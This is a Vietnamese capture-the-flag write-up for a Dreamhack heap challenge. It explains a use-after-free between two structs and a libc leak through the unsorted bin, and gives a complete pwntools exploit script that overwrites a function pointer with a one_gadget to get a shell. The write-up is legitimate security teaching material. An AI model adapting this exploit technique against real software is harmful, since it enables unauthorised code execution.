# Challenge: UAF_Overwrite

## Vấn đề
- [File challenge](https://github.com/haiwh07/CTFWriteUp/blob/main/dreamhack/uaf/uaf_overwrite)
- Chương trình thực thi như sau:
```
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  while ( 1 )
  {
    menu();
    __isoc99_scanf("%d", &v3);
    switch ( v3 )
    {
      case 2:
        robot_func();
        break;
      case 3:
        custom_func();
        break;
      case 1:
        human_func();
        break;
    }
  }
}
```
- Trong đó có 3 hàm sau, với mỗi lần nhập đúng thứ tự sẽ thực thi đúng hàm đã chọn:
> human_func()
```
void human_func()
{
  _WORD *v0; // rax

  human = malloc(0x20uLL);
  v0 = human;
  *(_DWORD *)human = 1634563400;
  v0[2] = 110;
  printf("Human Weight: ");
  __isoc99_scanf("%d", (char *)human + 16);
  printf("Human Age: ");
  __isoc99_scanf("%ld", (char *)human + 24);
  free(human);
}
```
> robot_func()
```
void robot_func()
{
  _WORD *v0; // rax

  robot = malloc(0x20uLL);
  v0 = robot;
  *(_DWORD *)robot = 1868722002;
  v0[2] = 116;
  printf("Robot Weight: ");
  __isoc99_scanf("%d", (char *)robot + 16);
  if ( *((_QWORD *)robot + 3) )
    (*((void (**)(void))robot + 3))();
  else
    *((_QWORD *)robot + 3) = print_name;
  (*((void (__fastcall **)(void *))robot + 3))(robot);
  free(robot);
}
```
> custom_func()
```
__int64 custom_func()
{
  int v1; // ebx
  unsigned int size; // [rsp+0h] [rbp-20h] BYREF
  unsigned int size_4; // [rsp+4h] [rbp-1Ch] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-18h]

  v4 = __readfsqword(0x28u);
  if ( c_idx <= 9 )
  {
    printf("Size: ");
    __isoc99_scanf("%d", &size);
    if ( size > 0xFF )
    {
      v1 = c_idx;
      *((_QWORD *)&custom + v1) = malloc(size);
      printf("Data: ");
      read(0, *((void **)&custom + c_idx), size - 1);
      printf("Data: %s\n", *((const char **)&custom + c_idx));
      printf("Free idx: ");
      __isoc99_scanf("%d", &size_4);
      if ( size_4 <= 9 )
      {
        if ( *((_QWORD *)&custom + size_4) )
        {
          free(*((void **)&custom + size_4));
          *((_QWORD *)&custom + size_4) = 0LL;
        }
      }
    }
    return (unsigned int)++c_idx;
  }
  else
  {
    puts("Custom FULL!!");
    return 0LL;
  }
}
```
- Checksec:
```
+ Arch:       amd64-64-little
+ RELRO:      Full RELRO
+ Stack:      Canary found
+ NX:         NX enabled
+ PIE:        PIE enabled
+ Stripped:   No
```

## Giải pháp
- Do khi checksec, tôi thấy tất cả cơ chế bảo mật đều được mở. Do đó, cần phải đọc source xem cần giải quyết theo hướng nào.
- Khi đọc source file c, tôi thấy rằng:
```
struct Human {
  char name[16];
  int weight;
  long age;
};

struct Robot {
  char name[16];
  int weight;
  void (*fptr)();
};
```
- Ở cấu trúc Human và Robot đều giống kích thước chỉ khác ở chỗ robot chứa trỏ về địa chỉ còn human chứa age. Từ đó, kiểm tra đến human_func() và robot_func() thì khi thực thi xong lệnh cả 2 hàm đều free(*) nhưng không đặt struct về NULL do đó, có thể khai thác UAF ở điểm này.
- Cùng xem qua hàm custom_func() còn lại xem có thể khai thác những gì:
```
int custom_func() {
  unsigned int size;
  unsigned int idx;
  if (c_idx > 9) {
    printf("Custom FULL!!\n");
    return 0;
  }

  printf("Size: ");
  scanf("%d", &size);

  if (size >= 0x100) {
    custom[c_idx] = malloc(size);
    printf("Data: ");
    read(0, custom[c_idx], size - 1);

    printf("Data: %s\n", custom[c_idx]);

    printf("Free idx: ");
    scanf("%d", &idx);

    if (idx < 10 && custom[idx]) {
      free(custom[idx]);
      custom[idx] = NULL;
    }
  }

  c_idx++;
}
```
- Có thể thấy c_idx ở đây là unsigned mà ở phần điều kiện free(custom[idx]); là nếu idx < 10 && custom[idx] thì mới free() do đó ta có thể khai thác nếu c_idx là âm thì malloc lúc này đã tạo không bị free và set custom[idx] = NULL.
> Có thể tạo malloc > 0x420 bytes đẩy vào unsorted bins khi đó bk và fd sẽ được gắn dữ liệu từ &main_arena do glibc ghi đè. Từ đó có thể leak dữ liệu từ đây.
- Mà chall này có chứa libc do đó có thể leak libc và dùng oneshot để lấy shell.

## Quá trình
- Trước tiên ta cần phải leak libc và tìm libc base trước, như tôi giải thích hàm custom_func() phía trên thì khi đặt c_idx là số âm chunk lúc này sẽ không bị free, do đó tôi sẽ tạo một chunk > 0x420 để đẩy vào unsorted bins mà glibc sẽ ghi đè dữ liệu libc leak từ &main_arena vào 16 bytes đầu của chunk này. Rồi tạo lại một chunk cùng với size trước đó để lệnh printf("Data: %s\n", custom[c_idx]); leak 16 bytes trong chunk ra.
```
def custom(size, data, idx):
    sla(b'> ', b'3')
    sla(b': ', str(size))
    sa(b': ', data)
    sla(b': ', str(idx))

#[1] Libc leak
custom(0x500, b'AAAA', -1) # Tạo chunk_A trong heap nhưng không free, lúc này chunk_A đang là idx = 0.
custom(0x500, b'CCCC', 0)  # Tạo chunk_C bằng size chunk_A và free custom[0] mà idx = 0 là chunk_A, do đó chunk_A bị đưa vào unsorted bins (chunk_size > 0x420) và glibc ghi libc từ &main_arena vào 16 bytes đầu của chunk_A
custom(0x500, b'B', -1) # Vì trong bins chứa unsorted bins do đó khi tạo chunk cùng chunk_size với chunk đang chứa trong bins nên chương trình sẽ lấy chunk_A gắn vào chunk_B này, mà chunk_A đang có 16 bytes đã leak lúc này ta ghi đè 1 byte để lệnh printf leak 7 bytes libc.
```
- Sau khi leak libc rồi và debug chương trình để tính offset từ libc leak tới libc base, từ đó ta có được libc base sau đó check qua one_gadget như sau:
```
└─$ one_gadget libc-2.27.so
0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL || {[rsp+0x40], [rsp+0x48], [rsp+0x50], [rsp+0x58], ...} is a valid argv

0xe54a8 execve("/bin/sh", r13, rbx)
constraints:
  [r13] == NULL || r13 == NULL || r13 is a valid argv
  [rbx] == NULL || rbx == NULL || rbx is a valid envp

0xe5622 execve("/bin/sh", rcx, rdx)
constraints:
  [rcx] == NULL || rcx == NULL || rcx is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
```
- Ta có 4 oneshot thì ta sẽ test cả 4 cái xem cái nào có thể dùng được. Như tôi nói ở trên ở hàm human_func() và robot_func() có thể khai thác UAF do đó human_func() ta đẩy one_gadget vào thì khi chạy robot_func() sẽ thực thi địa chỉ chứa trong human_func().
> Đẩy oneshot vào human_func() và chạy robot_func() để thực thi xem oneshot nào dùng được và khi chạy thành công ta sẽ có shell.

## Script
```
#!/usr/bin/env python3

from pwn import *

exe = ELF('uaf_overwrite_patched', checksec=False)
libc = ELF('libc-2.27.so', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 14871)
else:
    p = process([exe.path])
GDB()

oneshot = [0x4f432, 0xe54a8, 0xe5622, 0x10a41c]

def human(weight, age):
    sla(b'> ', b'1')
    sla(b': ', str(weight))
    sla(b': ', str(age))

def robot(weight):
    sla(b'> ', b'2')
    sla(b': ', str(weight))

def custom(size, data, idx):
    sla(b'> ', b'3')
    sla(b': ', str(size))
    sa(b': ', data)
    sla(b': ', str(idx))

#[1] Libc leak
custom(0x500, b'AAAA', -1) 
custom(0x500, b'CCCC', 0)
custom(0x500, b'B', -1)

libc_leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))
libc.address = libc_leak - 0x3ebc42
one_gadget = libc.address + oneshot[3]

info("Libc leak: " + hex(libc_leak))
info("Libc base: " + hex(libc.address))
info("One gadget: " + hex(one_gadget))

human("1", one_gadget)

robot("1")

p.interactive()
```
